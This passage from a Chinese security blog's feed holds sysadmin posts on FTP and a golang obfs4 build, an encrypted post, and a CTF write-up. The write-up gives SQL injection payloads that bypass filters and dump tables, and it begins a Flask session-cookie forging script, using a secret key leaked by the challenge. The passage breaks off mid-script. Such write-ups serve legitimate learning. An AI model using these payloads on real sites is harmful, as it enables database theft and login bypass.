alt=""></p><p>话说回来，如果没有特殊需要，还是用<code>lrzsz</code>方便…<br>最后，希望这篇文章能够帮助到你。</p><p>参考：<br><a href="https://blog.csdn.net/zyw_java/article/details/75212608">基于CentOS搭建FTP文件服务</a><br><a href="https://blog.csdn.net/kxwinxp/article/details/78595044">CentOS7安装FTP服务器</a><br><a href="https://blog.csdn.net/anzhen0429/article/details/75151173">553 Could not create file问题的解决</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SSH管理远程Linux服务器少不了文件的传输，虽然&lt;code&gt;lrzsz&lt;/code&gt;能够解决本地与远程服务器之间文件传输的问题，使用&lt;code&gt;sz/rz&lt;/code&gt;即可，比如：
    
    </summary>
    
    
      <category term="瞎捉摸的一些学习" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="FTP服务器搭建" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="Linux" scheme="http://ggb0n.cool/tags/Linux/"/>
    
      <category term="FTP" scheme="http://ggb0n.cool/tags/FTP/"/>
    
  </entry>
  
  <entry>
    <title>golang编译项目的一个巨坑</title>
    <link href="http://ggb0n.cool/2020/04/01/golang%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B7%A8%E5%9D%91/"/>
    <id>http://ggb0n.cool/2020/04/01/golang%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B7%A8%E5%9D%91/</id>
    <published>2020-04-01T02:07:31.000Z</published>
    <updated>2020-04-22T00:14:14.929Z</updated>
    
    <content type="html"><![CDATA[<p>最近在学一些新东西，涉及到了搭<code>obfs4</code>网桥，由于官方提供的网桥<a href="https://github.com/Yawning/obfs4">项目</a>是go语言编写的，之前又没学过、也没搭过相关环境，可以说基本是从零搞起，其中遇到的问题…算了，下面这个问题必须记录，网上都没找到解决方案，一定要记录一下。<a id="more"></a></p><h3 id="最初的环境搭建"><a href="#最初的环境搭建" class="headerlink" title="最初的环境搭建"></a>最初的环境搭建</h3><p>由于golang编写的项目会利用git去寻找依赖库，因此首先就需要配置git环境，由于之前知道了旧版的git可能会导致一些问题，于是就手动安装了新版的git。</p><h4 id="配置git环境"><a href="#配置git环境" class="headerlink" title="配置git环境"></a>配置git环境</h4><p>机器上可能已经存在git，可以通过如下命令查看版本信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git version</span><br></pre></td></tr></table></figure><p>如果版本较低，最好就手动更新一下。</p><p>首先移除旧版本的git：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum remove git</span><br></pre></td></tr></table></figure><p>然后安装最新版的git，当然最好先装一下依赖库：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</span><br><span class="line">yum install  gcc perl-ExtUtils-MakeMaker</span><br></pre></td></tr></table></figure><p>依赖库装好之后，就可以安装、编译最新版的git了：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@guest ~]# cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line">[root@guest src]# wget https:&#x2F;&#x2F;www.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.26.0.tar.xz</span><br><span class="line">[root@guest src]# tar -vxf git-2.26.0.tar.xz</span><br><span class="line">[root@guest src]# cd git-2.26.0</span><br><span class="line">[root@guest git-2.26.0]# make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all</span><br><span class="line">[root@guest git-2.26.0]# make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install</span><br><span class="line">[root@guest git-2.26.0]# echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line">[root@guest git-2.26.0]# source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>至此，最新版git配置完毕，可以查看其版本信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@guest git-2.26.0]# git version</span><br><span class="line">git version 2.26.0</span><br></pre></td></tr></table></figure><h4 id="配置golang环境"><a href="#配置golang环境" class="headerlink" title="配置golang环境"></a>配置golang环境</h4><p>golang的环境是参考网上的博客装的，其实就是利用yum安装：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@guest ~]# yum -y install golang</span><br></pre></td></tr></table></figure><p>最初装完之后也就没有管git的版本了，直接把<code>obfs4</code>的项目放在了<code>go/src</code>下进行编译了。</p><h4 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h4><p>利用上面的方法搭建的环境直接去编译项目，结果一直报错：</p><p><img src="http://ggb0n.cool/images/golang1.png" alt=""></p><p>不管是改项目目录、换方式编译，一直都是找不到依赖库的错误，甚至想到了会不会是作者的项目有问题、还给作者发了封邮件…请项目作者不要打我啊…</p><p>结果两天都没搞定…都要心灰意冷了…</p><p>偶然之间，我发现卸载<code>golang</code>的时候提示会同时卸载<code>git</code>，嗯？？？！！！<br>这个git还是1.8版本的，嗯？？？！！！</p><p>于是就实验了一下，我重新用yum装golang结果确实提示会同时装<code>git-1.8.1</code>，装上之后又看了一下git版本，<code>1.8.1</code>，woc…问题不会在这吧…实践证实，问题就在这。</p><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>首先把当前的golang直接<code>yum remove</code>掉，最好清的干净一些：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -rf &#x2F;usr&#x2F;local&#x2F;go</span><br></pre></td></tr></table></figure><p>git最新版的配置就不说了，上面已经讲到了，说一下最新版golang的安装配置。</p><p>到<a href="https://golang.org/">官网</a>下载最新版的压缩包，拖到vps里，当然也可以直接<code>wget</code>，之后进行解压：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxf go1.x.x.linux-amd64.tar.gz -C &#x2F;usr&#x2F;local</span><br></pre></td></tr></table></figure><p>然后配置环境变量：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>在<code>profile</code>末尾添加如下内容：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#golang env config</span><br><span class="line">export GO111MODULE&#x3D;on</span><br><span class="line">export GOROOT&#x3D;&#x2F;usr&#x2F;local&#x2F;go </span><br><span class="line">export GOPATH&#x3D;&#x2F;home&#x2F;gopath</span><br><span class="line">export PATH&#x3D;$PATH:$GOROOT&#x2F;bin:$GOPATH&#x2F;bin</span><br></pre></td></tr></table></figure><blockquote><p>这里的GO111MODULE配置是go1.11后出的一种新的包管理go modules方式代替vendor机制，可以不需要GOPATH，项目代码也不一定要放在GOPATH下面。</p><ul><li>GO111MODULE=auto 自动</li><li>GO111MODULE=on 使用go modules，不会在vendor和gopath找依赖</li><li>GO111MODULE=off 使用vendor 或者gotpath</li></ul></blockquote><p>然后到<code>/home</code>下新建<code>gopath</code>文件夹，新建之后即可使配置生效：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>查看golang版本<code>go version</code>已经是最新版。</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>将obfs4的项目放到<code>/home/gopath</code>之下，再次进行编译：</p><p><img src="http://ggb0n.cool/images/golang2.png" alt=""></p><p>可以看到，已经可以成功编译。</p><p>问题解决，散花，不知道这是不是全网第一个解决这个问题的文章，不过还是惬意一下。</p><p>参考：<br><a href="https://www.cnblogs.com/kevingrace/p/8252517.html">git最新版配置</a><br><a href="https://www.cnblogs.com/nickchou/p/10934025.html">golang最新版配置</a><br><a href="https://github.com/Yawning/obfs4">obfs4网桥配置</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在学一些新东西，涉及到了搭&lt;code&gt;obfs4&lt;/code&gt;网桥，由于官方提供的网桥&lt;a href=&quot;https://github.com/Yawning/obfs4&quot;&gt;项目&lt;/a&gt;是go语言编写的，之前又没学过、也没搭过相关环境，可以说基本是从零搞起，其中遇到的问题…算了，下面这个问题必须记录，网上都没找到解决方案，一定要记录一下。
    
    </summary>
    
    
      <category term="瞎捉摸的一些学习" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="obfs4网桥搭建" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="Linux" scheme="http://ggb0n.cool/tags/Linux/"/>
    
      <category term="golang" scheme="http://ggb0n.cool/tags/golang/"/>
    
      <category term="git" scheme="http://ggb0n.cool/tags/git/"/>
    
      <category term="Tor" scheme="http://ggb0n.cool/tags/Tor/"/>
    
      <category term="obfs4网桥" scheme="http://ggb0n.cool/tags/obfs4%E7%BD%91%E6%A1%A5/"/>
    
  </entry>
  
  <entry>
    <title>记录一次网络配置</title>
    <link href="http://ggb0n.cool/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/"/>
    <id>http://ggb0n.cool/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</id>
    <published>2020-03-28T03:41:06.000Z</published>
    <updated>2020-04-22T00:24:32.801Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="不好意思，密码没对哦，在检查检查呢！" data-whm="不好意思，信息无法验证">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">嗨，请准确无误地输入密码查看哟！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="94c8feb45044bada49f9250db34616198461102ecb14dd347b867e1f041ec5af">1fbf72b2372de9b3a01247e55a1bbafbc6aa0bf5d7d642bd430b7cb1c8268a3dfcc1a58cd930bfb402ef37ae414a51dfbf30fe23db46b80fbf3d668d8dd9fca9ed158481a725cc6d1384e999b84465260467cfe5e99cbabaaad7213dce90123c282d5d07668851261b09dc74eec002f037bb2ff47c7365bf92cd288b26fd64f90df38d76d8682eae110e421e5e956c4982d0f202be6b84eb749aebb2656217f445909e984eb98ecdd692cfad9563726600bebd537e2df533a13737f976f854886994072c8dc1e5e83b87bf3aeea8a0e7b76434edbbc0599f03d85f5c3c1b99083fc4e428d1ce5809ed4efec011548f24d7fec7f60789626ee66e22e695c7aa4cb7344f30d89a20e3cad575fed5ccc60b8df0c99c1d9c647767e0bb40a8e9453ad3078466db54daadd0da0607037e9191e2b69ffd7b03b7b903e7e234b8ebef1631697b652714503eba6e40fa55388aea78d1e239f834bc1d75f051d29f2365ba353822ecb581e332c0bdd93a1141da39d14eafcf964e1f5ce81e1786861975b80c4edd166d200b359695fe75be745b6b1648a0483345c9336539351fb4ec7f5f010411ca5f9ec87ff3e15682763bedb70dd06d39ff4499fa1082cd85bb64b31625d8a3ce1ae36e828d52755535a32f068c0506366d92db9d60ddbde0f9aa21f29ee7f71e8140e8bf73ad66e550f841d2600183c60e8a9b01970231faa4f3ed13baa45cc1ce4880f58bf98748de89c12c353b1341f531254fdeb3dea2071bc687d38a9fe78d4c7d2afbbdde06596ee29fd3ca20f3f9dfb56f0284b44a2c9d508343548db99ff8de8a81a4d62e45cdffe5b4dab25edee884ee145973c88c74c0b522b657800cd1c335165589cc3fa946f5265c77b962fcf654087ee7dabfaa6fd14ddc99eb71648708be90771b44c57d5bf57df2897b52504032f95c00763b192fba3822c6934cd19c969e29cf91dda439577d3f69e40431b7f874cfc51b6d2b7201f646c96637c2ef176a0a19a0f47d2f93a3c3117c37295db712c5d5a87d9b3fef208269ec0d1e0660783930377e044ce1ef6e521a76d865b35cf1d4f5dd6e7804a93950da0a403a687ef52b9ecda62b2b4aae6288664799b19826ef51206b57c1bfaa3675a031de0c1429cf4db66ed671d934ebad980c54b8f04c97d17d056dad2f9feb68fee7ad1729ea8be41766a8e420351de08ed4da551b4fbed6975a51f97e6dc25e2da16fb43098c82d4976f18d3229731535eb2983cadb18df883aefbd1c3847bec45b69c22106e660fd096de6345cabe96cc2c893711221bf63e0253a9b113c4f376a81b119c26a204789b492232e282d8d7ca01411cb41e2777116515587925e82ff7fc2fa9057876c4073e76fa30883b7b745f8a432ad8dd65142cbdd17d587cdb2eca228d03c1423afc08ed0cffde9c5888f247306073044ef22a2f2f751a8d23c94d90fe1ae49dd6798ada31c0d7141f76bcf9a6c0d34da7dedaba0e2020b79e8e8307cb82581ae81908e8fddd167e6964f8b819bbe3b72ef4d2876960f07a52ca9af98baaf1edf64326499fa5ad2aed347674854bbf8bb23ea70a1f511ed1f79d6fe8004b129439a56aea966d5e0496dccbe816bdb1eefb061af8af62e306f330bdc27445cb0876ea8e97ff62da359be96743f77c50e5cb7bd0402e4b9e8ad071c555ad140b5f6b23b4d95d74d0c74de1d050111f6d12143e758a549b98e6b9cac103dfc4f6510797bafb7aa4dc11f559eae75125b37e571e094ebf324afb0630800fdb1af93068f37f8cd977757ff9199e475382f032033b7d035520adc3752659b7c65b63f8570eeaa3c8ed51b35e709b464476fd15d8419660a07b9f2e32e438153cb2f96edeebc0eeb44eeb135adba253818f000f97cf60253a198c5d7c1201edaf548591d2e823b5bbbcdf2bded62bc2dcb5ab6c87a530350ca20d74aa6232f543faf6f7af5baa896a5168304237d02974fa28e539e4fff254d695a1249d46036d78d4d225bdac8f4b1466b64e81fc37eeabc43f02fd80fc00d13cb1f95a8d882cef4613c745a1fb07166dfeaa1b7d1deba7d9637be329c14cab49fdaa21e0f81677bff0fef52afa3c0821a82c157818422c9efa5613de9db91d4b5f3df6255d1fbabffd9fa49619e950a800d7865e99283f3c4b0d08436cabe3e6150f40bb971115bf4b44cb73fa4d936383350542681e0a91a8780a79277dbe4fa95ee449e6e5239ef01c0da1d67eae32cf386d365cb72e673f501071eb9025a95201c34239ff28a9862583b549441bb8085b3d943eef183d337ad6133116d2cb248d9f1c5de148fac081e31a7c76610b27c98d88338bd45695d5cb74a47487ed8c513c73f0d3e3fde019d1eef42cbe2068498d67d15c5412c4ef9e95c88f4c265f525574a4aea595d91acd9f52b20e30a28baced7bf5322fd82d20c918028e3f9717e9b5d27736bfc95d1ec0946d748045000dad6ce808803756ca2069ff5a451e75a0991d62208105060bc09868dca927474fc828be9bd424b0ac5ba47b754513d8015b5d10e632b5a533d539b4747ed84ffb16e9c5af8e5807c51c8461d00f126d5ef4033fec5858874e52c83775e99a87e87472a3b7a83d3614a4fa0618fe08d73ea3946b63344e92bdab527bdbd24cb67d4e30b600f5859c1f588d780d16ab131b504a01aa4e742b68fa682caf113513666d963582b680e4b3aa2d65371c8e3d554fc8f7ec491d7fbce1ec319446b463e297405fc553305fe5621a111743fa9d6b1c6b15e1d7a302b39b597bd2afc9e80ff836e3ccc3b109a28db558f8b9c703fa1c514dd80650b9b21083051ddd8d00f66b2cebfabbf4adf16d37ea589beeda5aa3d1b67b2885fcb9b96813a6089b0f807a4ab8853342384291154857398157df45fa0b47d3ad78e9b4db9473bef122ccb683c6e0b4bc2d01a64ed6466b7c3c4617329a9014368105e0df2cc3da87d0767c9c91753262c47c8ca5f387e8584e5b5ac3cc1e9d2305aaffa5b591aef3209c8a4e17d757251899b9c66e2ff435a3996968bb80ca3368b5f409f6ea3814595ec719d6cb33765d8fd7f601e10ae5d90129b174776003faa622c7ee573adeabee65246295899976c177acfcc53d8a949de4836c280fbc5097ac735782bdbb52187d15d5f7e6fab7a8aa3fded78a1b347b8fa6d809291315ef11a215983b3a45ccff4756da40ca8e0da903c85c7beb75791b3b89a49829628ea722b119cb65358faf3a96a45783808c4699ac2df2aa44a1c52876218ee0ca43f130ef634bb83a22b3eb487a20ec37b7417bd9ee4eb4ec0231d727ac24d6bb6f5df176650122c6c012261d2b7bff2fca626ebab5fe634aae374d3503b00bab34d2b6d0309acf49b6a18d8365fe2174375c10b9b027b0636289035618caf7227ba3ebb9b26dd922355d725084915ef5d878555fd4a70743a0d6430c882e1c60f8f47de05c72b51949c596016601f4c54609a759db2148243c2f1bd5b26a68b4745ee8f2b814e286339599956c5eba1ddc42d16e8d5048cc1335511a836e459e2003a8655815cd87c46580df61aa32b54a7948f494000fa12eb919edba7f98fa308352f1d2f8ef55640fd4023c8ecc663d5fe74b80726ee8e4a7a59d0491f632fbb452c601008e553a16a576b215c9cb0c43c3f576561422e1f94a734ea8783ec4a587da95a70b9400e813622d7236fb600b49f4cd3054ecab7303b1b3e51c462f62a14e0e9ddebf67d5db8d84997a6118ab2461ebbe2d4e2eec998b5b6238f1238f9c59a18a51affcd887467839d8abd971b413117fe5c631c1a321ada8b36f7936c3a06dfa69ea3022c85469aa1e2757d3722b7389be19b0602af4beae57fa4687ddcad11306c373d8c8e4f1d70f1664ac7fa389bd859c2110e5594f72f1cf28acfb784421dbd13df41919fd2b45f0cb3001a71d774a6f9f9e1a30c3f8243f8f3c76210d117267a14dd2fc851f816f5dae44af6c96b7a2aeb3697d796f04fe4e93506394c9bc4b6070eee487c564ca438d0d26ccfa28c001b6b239b0e3ff006ac11bad484f435b19f66395ec872388467dfb0b57a7d7fc4a39e69535e17895af065bff00a7d6de0384977bcf170d13f3b6225874f2f1c587978906991a345ff8dce935e17fb10babbd217a3b61b5c4ee673975f17ada362a8d46e91097a722390afcb6d02692be82cc1d34b04f64996df0855e65929e63c960b289ea4977e3fd1a5d0b014c384ac741200d41b5254643c902e511eb4b48ba9b0562339a8ba39ebdb14e0989265b53bd68436ff508bcbfa1b94402fc6b66048a6198c5dafc8149fe316d89b2a7465e7c2b70f1a5a58538bfd492b99613cecc4644c9be3e181b3b3167e7d8be0fdf67672143bc7814a8f095a878d818c8fe38d880a43463ceb2ca1a26c30c67e41a80ee0e557050a8d5fc60dfaf1de42b61fb45374624781a4b0512ff98c0d997311f878ed29f698ed8e7a0dbe345ab206e00b817e3eff2f1341af74d9d9ad3cafd4398a0e3fae6eb3a554054da8b68f41304124d8aadab6abcfd383fa6ad4a4d3a84f891a4553eee431a71c7d2be658ff057537b5accd8bf0d6ef51099988a392cc09bc152d9f86c1b039e88180b9b26e56530b1a3a0197a28ee8a692d22839b1363cdda399a8fee0eb9dbb560cfdffb17a9f16297bb946cd0387be464acbb959560d5212fb161c52c5478814b2abf2c26483928e24d95d72b3bcd0ecb524dd718aa918240859b211c9c85140d88d6358ff6d94fa23a5092eac9d262009170e07abb77aa5f1deb62b4d93918264de8cd089ffb80c792464e72874237d00bc863eaa3d7668c112d1c9b776c409b57415118d54c14ccd5db307ce8b31a7642e5686e58ffc642dedbc591eb9a83260da341b0870262936d4f504baf0051f5088a1ec5d4bdbc115d24c0efedef6f94d33df40720a7f056cf9fc0195be2c1fa42bc159da034682c6d5cbffbc6b768c174733f41ed447dd03979ff357cb23b08d96a819a9d939055481695d2d601f0c40d69ee8e529f797facf68e25e54c6c7a7d3d4f8e709122106c6bcc2531d5d42998c9b1fa495059724534421deaff93f2986ace02a2ae1a1067f95817d7316bc68eac966a1aeb8cf8463428d3e66605363a80b458b75e71a4f95095a10346669a6d741e13e695b002679aaca28345f915bf70672aaf7b8436fbcf8ee603a7ce4213e7be8cc5a40c7b1852f2f5283089003df536344f553c1fc361bf66d02d1b6a04d64e552d083368e3849e98a563602be5b11980e012393b5e54a3cef96674cabf3332ade3aae445beb434f0bcae6113f08e428b150a1aa98e99560c56b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      咦，这是一篇加密文章，好像需要输入密码才能查看呢！
    
    </summary>
    
    
    
      <category term="网络配置" scheme="http://ggb0n.cool/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>SWPU2019复现</title>
    <link href="http://ggb0n.cool/2020/03/20/SWPU2019%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ggb0n.cool/2020/03/20/SWPU2019%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-03-20T11:55:48.000Z</published>
    <updated>2020-04-22T00:15:38.874Z</updated>
    
    <content type="html"><![CDATA[<p>一直想着复现来着，记事本里也记录了几个月了…🤣<a id="more"></a></p><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p>二次注入、无列名查询，对<code>MariaDB</code>过滤<code>information_schema</code>的注入。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目注册并登陆之后，发现可以发布广告，并且在广告名的地方存在<code>二次注入</code>(提交内容的时候注入不执行，查询的时候才执行)，经过测试发现<code>or</code>被ban了，同时空格也会被替换为空，因此需要利用<code>/**/</code>绕过对空格的过滤。<br>既然<code>or</code>被ban掉了，那么便不能再利用<code>order by</code>注入查列数了，此时只能直接利用<code>union select</code>进行列名的遍历了。<br>在测试的过程中发现了后台数据库是<code>MariaDB</code><br><img src="http://www.ggb0n.cool/images/BUUCTF-web50.png" alt=""><br>同时<code>or</code>被ban掉，因此<code>information_schema</code>不能用，此时想到利用<code>mysql.innodb_table_stats</code>来查表名(这个地方可以参考：<a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/)，但是无法获取列名，因此最终获取flag需要借助`无列名注入`了(参考：https://blog.csdn.net/chasingin/article/details/103476001)。">https://mariadb.com/kb/en/mysqlinnodb_table_stats/)，但是无法获取列名，因此最终获取flag需要借助`无列名注入`了(参考：https://blog.csdn.net/chasingin/article/details/103476001)。</a></p><p>现在思路就很明确了，首先利用<code>union select</code>测试出列数，然后利用<code>mysql.innodb_table_stats</code>查出表名，最后无列名注入拿到flag。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>首先查列数：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p>利用<code>mysql.innodb_table_stats</code>查表名：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web48.png" alt=""><br>将列转换为行，进行无列名注入：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web49.png" alt=""></p><p>另外补充一点，如果后台数据库是<code>mysql</code>，但是<code>information_schema</code>被ban掉之后，如果<code>mysql</code>没有开启<code>innodb存储引擎</code>则可利用<code>sys数据库``schema_auto_increment_columns</code>和<code>schema_table_statistics_with_buffer</code>来绕过，但是本题后台数据库是<code>MariaDB</code>，上述方法便不可用，不过给一下我做题的时候测试的payload，遇到类似题目可能用得上：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)from&#x2F;**&#x2F;sys.schema_auto_increment_column&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)from&#x2F;**&#x2F;sys.schema_table_statistics_with_buffer&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p>然后再利用<code>join</code>或<code>join...using</code>进行无列名查询即可。<br>绕过<code>information_schema</code>可以参考：<a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><h2 id="easy-python"><a href="#easy-python" class="headerlink" title="easy_python"></a>easy_python</h2><p>考察JWT伪造攻击，软链接任意文件读取</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目是一个登录框，任意用户名密码登录，发现可以进行文件上传：<br><img src="http://ggb0n.cool/images/swpuctf02.png" alt=""></p><p>直接点按钮反馈没有权限…</p><p>看源码发现了<code>404 not found</code>的提示，网上的wp是这么说的：</p><blockquote><p>在<code>flask</code>中，可以使用<code>app.errorhandler()</code>装饰器来注册错误处理函数，参数是<code>HTTP 错误状态码</code>或者<code>特定的异常类</code>，由此我们可以联想到在<code>404</code>错误中会有东西存在。</p></blockquote><p>那么我们构造一个任意的文件到url中去访问，看一下回显：<br><img src="http://ggb0n.cool/images/swpuctf03.png" alt=""></p><p>发现响应头中存在<br><code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p><p>解码得到：<br><code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code></p><p>结合前面的权限要求，猜测是JWT伪造了，但是这个题中的JWT直接去解base64的结果是这样的：<br><code>{&quot;id&quot;:{&quot; b&quot;:&quot;MTAw&quot;},&quot;is_login&quot;:true,&quot;password&quot;:&quot;123&quot;,&quot;username&quot;:&quot;123&quot;}</code></p><p>期初一直以这种结构去伪造，服务器就老是反馈<code>500 error</code>，后来参考网上一篇wp中讲的解JWT用的是如下的代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">""" Flask Session Cookie Decoder/Encoder """</span></span><br><span class="line">__author__ = <span class="string">'Wilson Sumanang, Alexandre ZANNI'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Must be using at least Python 3'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockApp</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, secret_key)</span>:</span></span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span><span class="params">(metaclass=ABCMeta)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(secret_key, session_cookie_structure)</span>:</span></span><br><span class="line">            <span class="string">""" Encode a Flask session cookie """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span 